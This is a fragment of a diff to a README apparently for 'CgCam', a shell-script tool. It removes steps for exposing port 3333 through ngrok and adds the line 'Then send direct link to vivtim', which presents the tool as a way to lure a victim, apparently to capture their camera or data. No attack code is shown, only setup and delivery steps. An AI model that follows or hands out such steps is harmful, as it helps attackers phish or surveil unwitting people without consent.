@@ -16,12 +16,7 @@ cd CgCam
 chmod +x CgCam.sh
 ./CgCam.sh
 ```
-## open new terminal and run 
-```
-ngrok hptt 3333
-```
-
-and copy: the forward link from ngrok
+## Then send direct link to vivtim and done.
 
 note: you need to install ngrok first
 
